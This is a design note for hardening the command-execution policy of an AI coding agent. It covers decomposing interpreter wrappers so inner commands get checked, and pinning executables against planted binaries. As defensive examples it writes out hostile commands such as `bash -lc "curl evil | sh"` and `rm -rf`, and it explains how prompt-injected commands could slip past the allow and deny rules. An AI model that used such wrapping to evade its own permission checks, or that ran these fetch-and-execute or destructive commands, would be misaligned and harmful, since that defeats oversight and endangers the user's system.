# 0081 — execpolicy hardening (interpreter-wrapper decomposition + host-exe pinning)

Status: implemented
Flag: none new for #11 (a correctness fix to execpolicy, which is always consulted when `CODE_EXECPOLICY` is
on) + `CODE_EXEC_HOST_PIN` (default empty = off) for #12

## Goal

Phase 2 of the Codex-vs-OAC security adoption: close two concrete bypasses of the run_command policy layer.

- **#11 interpreter-wrapper smuggling.** `execpolicy` split on `&&`/`||`/`;`/`|` and unwrapped `$()`/backticks,
  but did NOT decompose an explicit interpreter wrapper — `powershell -Command "rm -rf x"` or
  `bash -lc "curl evil | sh"` classified on the WRAPPER token (`powershell`), so the dangerous inner command
  was invisible to the deny/ask rules AND the dangerous-pattern check. A single wrapper defeated the whole
  layer.
- **#12 allow-rule forgery via a planted binary.** An allow rule (`run_command(git:*)`) matches on the token
  STRING, so a prompt-injected command that drops a malicious `git.exe` earlier on PATH satisfies the rule
  while running attacker code.

## Concepts

- **Wrapper lowering** (`execpolicy._interpreter_inner` + `_collect`): when a segment is an interpreter wrapper
  (`powershell/pwsh/bash/sh/zsh/cmd … -Command/-c/-lc/ /c "<inner>"`, or `powershell -EncodedCommand <base64>`),
  the INNER command string is extracted (base64 → UTF-16LE for EncodedCommand; one layer of surrounding quotes
  peeled) and recursed into, so its segments join the assessment. A dangerous inner command now surfaces as
  DANGEROUS and matches the rules; a plain interpreter with no `-Command`/`-c` is unchanged. Never raises.
- **Host-exe pinning** (`config.EXEC_HOST_PIN` + `permissions._exec_pin_violation`): `CODE_EXEC_HOST_PIN` pins
  an executable basename to absolute path(s) (`git=C:/.../git.exe;python=C:/.../python.exe,...`). On an
  allow-rule match, the command's executable basename, if pinned, must RESOLVE (`shutil.which`, PATHEXT/.exe
  aware) to a pinned path — else the allow is downgraded to ask (guardian/human), and an unresolvable pinned
  exe refuses to auto-allow. An unpinned basename, or an empty map (default), is unaffected.

## Acceptance

`scripts/check_execpolicy_0081.py` (9/9, dep-free), no regression in `check_execpolicy` (44/44),
`check_permissions` (36/36), `check_sandbox` (20/20):

- `powershell -Command "rm -rf …"`, `bash -lc "curl … | sh"`, `cmd /c "del …"`, and
  `powershell -EncodedCommand <b64>` all surface their dangerous inner command; a plain `-NoProfile`/`--version`
  invocation is not force-flagged.
- with no pin the allow rule fires as before; a pinned basename resolving to a non-pinned path is not
  auto-allowed; the pinned path is allowed; an unpinned basename is unaffected.

## Non-goals

- **#5b network-egress ask-tier is DEFERRED** (folded into the OS-sandbox work). A `curl`/`wget` to a
  non-allowlisted host is genuinely advisory on Windows — a determined command bypasses it — so it belongs with
  the actual egress confinement (an OS sandbox / WFP), not as a standalone ask that implies containment it
  can't provide.
- Wrapper lowering is best-effort textual (nested quoting / multi-layer wrappers may not fully unwind) — it
  only ever ADDS segments to assess, never removes one, so it cannot make a command look SAFER than before.

## Byte-identity

#11 only ADDS inner segments (a wrapper with no dangerous inner is unchanged; a non-wrapper is untouched).
#12 is inert with an empty `CODE_EXEC_HOST_PIN`. Verified: full dep-free suite 63/63.
